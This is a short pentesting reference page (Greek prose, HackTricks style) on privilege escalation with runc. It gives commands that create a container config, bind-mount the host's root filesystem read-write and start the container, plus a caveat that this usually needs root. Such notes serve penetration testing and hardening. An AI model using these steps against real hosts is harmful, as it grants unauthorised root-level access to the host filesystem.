# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

Αν θέλετε να μάθετε περισσότερα για το **runc** ελέγξτε την παρακάτω σελίδα:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Αν διαπιστώσετε ότι το `runc` είναι εγκατεστημένο στον host, μπορεί να είστε σε θέση να **τρέξετε ένα container που να προσαρτά τον ριζικό φάκελο / του host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Αυτό δεν θα λειτουργεί πάντα καθώς η προεπιλεγμένη λειτουργία του runc είναι να εκτελείται ως root, οπότε η εκτέλεσή του ως μη προνομιούχος χρήστης απλά δεν μπορεί να λειτουργήσει (εκτός αν έχετε μια ρύθμιση χωρίς root). Η ρύθμιση χωρίς root ως προεπιλεγμένη δεν είναι γενικά καλή ιδέα επειδή υπάρχουν αρκετοί περιορισμοί μέσα σε κοντέινερ χωρίς root που δεν ισχύουν έξω από κοντέινερ χωρίς root.

{{#include ../../banners/hacktricks-training.md}}
